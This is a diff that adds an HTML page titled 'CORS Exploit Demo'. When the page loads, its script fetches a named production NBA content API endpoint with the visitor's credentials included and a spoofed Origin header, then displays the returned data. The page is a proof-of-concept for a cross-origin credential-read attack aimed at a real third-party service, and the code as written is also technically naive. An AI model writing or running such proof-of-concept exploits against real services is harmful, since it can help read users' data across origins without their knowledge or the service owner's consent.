@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CORS Exploit Demo</title>
+</head>
+<body>
+    <h1>CORS Exploit Demo</h1>
+    <pre id="output">Loading...</pre>
+    <script>
+        // Fetch request with improved error handling and output formatting
+        function fetchCORSData() {
+            fetch("https://content-api-prod.nba.com/public/1/leagues/nba/blackouts?zip=30067", {
+                method: "GET",
+                credentials: "include",
+                headers: {
+                    "Origin": "https://your-unrelated-domain.com"
+                }
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error(`HTTP error! Status: ${response.status}`);
+                }
+                return response.json();
+            })
+            .then(data => {
+                document.getElementById("output").textContent = JSON.stringify(data, null, 2);
+            })
+            .catch(error => {
+                document.getElementById("output").textContent = `Error: ${error.message}`;
+                console.error('Fetch error:', error);
+            });
+        }
+
+        // Initiate fetch when page loads
+        document.addEventListener("DOMContentLoaded", fetchCORSData);
+    </script>
+</body>
+</html>
